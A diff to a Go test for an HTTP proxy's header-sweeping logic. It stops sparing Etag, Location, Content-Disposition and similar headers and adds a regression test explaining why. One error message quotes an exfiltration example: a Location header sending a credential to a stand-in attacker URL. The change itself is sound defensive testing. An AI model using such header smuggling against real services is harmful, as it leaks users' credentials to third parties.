@@ -540,11 +540,32 @@ func TestBL12_StandardHeadersSparedUnknownHeadersSwept(t *testing.T) {
 	}
 	_ = standard
 	// isNonStandardHeader is the load-bearing decision; pin it directly too.
+	//
+	// BL-22 REMOVED "Etag" from this list on purpose, and it used to be asserted here.
+	// The criterion the list applied was "is this header part of the HTTP protocol
+	// vocabulary", on the assumption that such values are stack-generated. Etag's value
+	// is an opaque QUOTED STRING of the origin's choosing — exactly where a hostile
+	// upstream can hide a credential — so the assumption is false for it. Same for
+	// Location, Content-Location, Content-Disposition (a filename!), Warning and Server.
+	// Removing a name from a SPARE list means MORE sweeping, so the change is fail-safe.
 	for _, h := range []string{"Content-Type", "Content-Length", "Date", "Cache-Control",
-		"Etag", "Last-Modified", "X-Request-Id", "Strict-Transport-Security"} {
+		"Last-Modified", "X-Request-Id", "Strict-Transport-Security"} {
 		if isNonStandardHeader(http.CanonicalHeaderKey(h)) {
 			t.Errorf("%s was classified non-standard and would be swept; it is protocol "+
 				"metadata the client needs", h)
+		}
+	}
+	// And the BL-22 direction: these standard headers carry origin-chosen free text or
+	// URIs, so they MUST be swept now. If someone re-adds one to the spare list, this
+	// fails and points at the reason.
+	for _, h := range []string{"Etag", "Location", "Content-Location",
+		"Content-Disposition", "Warning", "Server"} {
+		if !isNonStandardHeader(http.CanonicalHeaderKey(h)) {
+			t.Errorf("BL-22 regression: %s was re-added to the spare list. Its value is "+
+				"origin-chosen free text or a URI, so a hostile upstream can put a "+
+				"credential in it — the round-8 reviewer served Location: "+
+				"https://attacker.example/collect?tok=<credential> to the client "+
+				"byte-for-byte on a 200", h)
 		}
 	}
 	for _, h := range []string{"X-Model-Output", "X-User-Email", "X-Made-Up", "Foo"} {
